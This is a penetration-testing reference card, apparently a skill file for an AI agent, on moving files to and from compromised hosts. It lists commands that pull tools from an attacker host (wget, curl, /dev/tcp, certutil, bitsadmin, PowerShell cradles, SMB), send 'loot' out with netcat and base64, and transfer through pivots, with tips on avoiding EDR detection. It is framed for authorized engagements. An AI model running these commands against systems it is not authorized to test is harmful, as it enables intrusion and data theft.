---
name: payloads-file-transfers
description: >
  Move files on/off a target when there's no shared drive — upload tools (linpeas, nc, exploits),
  pull loot back, and do it through a pivot or when wget/curl are missing. Load when you need to get
  a file to or from an authorized host. Signals: "transfer a file", "upload linpeas", "no wget/curl",
  "get the file off the box", certutil/bitsadmin/impacket-smbserver, exfil over a tunnel.
domain: payloads
type: reference
stability: learning
modes: [pentest]
severity: info
mitre: [T1105, T1041]
tools: [python, nc, certutil, impacket, chisel]
schema_version: 1
---

# File transfers

## When it applies
You have a shell and need to stage a tool onto the target, or pull data/loot back to your box, and
there's no shared filesystem. Pick the method by what the target has (Linux vs Windows, which
binaries exist) and whether you're reaching it directly or through a pivot. `$LHOST` is your box.

## Why it works
Almost every host can speak HTTP, SMB, or raw TCP with something already installed — a language
runtime, `certutil`, `bitsadmin`, `nc`, or `/dev/tcp`. You host the file on your side and pull it
with whatever the target has; for exfil you reverse the direction. Base64 copy-paste works even with
no network path at all.

## Method
**Attacker → Linux target**
```
# serve from your box:
python3 -m http.server 80
# on target, pick what exists:
wget http://$LHOST/linpeas.sh -O /tmp/l.sh
curl http://$LHOST/linpeas.sh -o /tmp/l.sh
exec 3<>/dev/tcp/$LHOST/80; echo -e "GET /f HTTP/1.0\r\n\r" >&3; cat <&3   # no wget/curl
# base64 (no network): paste on target →  echo "<b64>" | base64 -d > /tmp/f
```

**Attacker → Windows target**
```
certutil -urlcache -split -f http://$LHOST/nc.exe C:\Windows\Temp\nc.exe
powershell iwr http://$LHOST/x.exe -o C:\Windows\Temp\x.exe
powershell (New-Object Net.WebClient).DownloadFile('http://$LHOST/x.exe','C:\Windows\Temp\x.exe')
bitsadmin /transfer j http://$LHOST/x.exe C:\Windows\Temp\x.exe
# SMB (great for AV-touchy files): attacker →
impacket-smbserver share . -smb2support            # add -user u -password p for modern Windows
# target →
copy \\$LHOST\share\x.exe C:\Windows\Temp\x.exe
```

**Target → Attacker (exfil)**
```
# netcat:  attacker: nc -lvnp 4444 > loot     target: nc $LHOST 4444 < /path/loot
# base64:  target: base64 -w0 /path/loot      attacker: echo "<b64>" | base64 -d > loot
# HTTP POST to a tiny receiver, or SMB write-back to your impacket share
# scp (with creds): scp user@target:/path/loot ./
```

**Through a pivot** (see `network-pivoting-tunneling`)
```
# SSH tunnel:  ssh -L 8888:internal:80 user@foothold  → wget http://127.0.0.1:8888/f
# chisel/ligolo: once the tunnel is up, transfer straight to the internal host
```

## Gotchas
- **Windows `certutil`/`bitsadmin` are flagged by some EDR** — SMB pull or a fresh PowerShell
  download cradle is often quieter; on modern Windows the SMB server needs credentials
  (`-user`/`-password`) or the client refuses guest.
- **Write somewhere you can write/execute** — `/tmp` or `/dev/shm` (watch `noexec` mounts) on Linux;
  `C:\Windows\Temp` or your user profile on Windows.
- **Integrity** — verify size/hash after transfer (`sha256sum`/`Get-FileHash`); truncated tools fail
  in confusing ways.
- **Base64 has size limits** in a cramped shell — chunk large files or use a real channel.
- **Keep loot minimal and in the git-ignored `engagements/<target>/loot/`** — don't hoard real data.

## Verify success
The file exists intact on the destination (matching hash/size) and, for a tool, runs; for exfil, the
pulled copy opens correctly on your box.

## References
PayloadsAllTheThings (File Transfer); Impacket `smbserver`; LOLBAS (certutil/bitsadmin).
Related: `payloads-reverse-shells`, `network-pivoting-tunneling`, `network-credential-cracking`.
